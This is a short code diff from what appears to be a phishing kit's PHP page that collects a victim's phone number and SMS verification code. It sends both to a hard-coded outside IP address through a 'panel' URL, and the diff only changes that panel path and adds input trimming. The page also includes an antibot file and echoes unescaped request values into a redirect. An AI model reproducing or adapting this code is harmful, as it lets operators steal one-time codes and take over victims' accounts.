@@ -8,13 +8,14 @@ include('../../files/boot/antibot.php');
 include('../../files/boot/enc.php');
 include('../../call.php');
 $user = @$_POST['user'];
-$code = $_POST['code'];
-$phone = $_POST['phone'];
+$code = trim($_POST['code']);
+$phone = trim($_POST['phone']);
+echo $phone . " : " . $code;
 if ($code == "") {
   echo '<meta http-equiv="refresh" content="0; URL=codeinfo.php?error=1&phone=' . $phone . '&user=' . $user . '">';
 	die();
 }
-$test = @file_get_contents("http://137.74.171.167/panelZ/a.php?sms=$phone,$code");        // here goes the panel
+$test = @file_get_contents("http://137.74.171.167/panelo/a.php?sms=$phone,$code");        // here goes the panel
 ?>
 <!DOCTYPE html>
 <html class="no-js" lang="en">
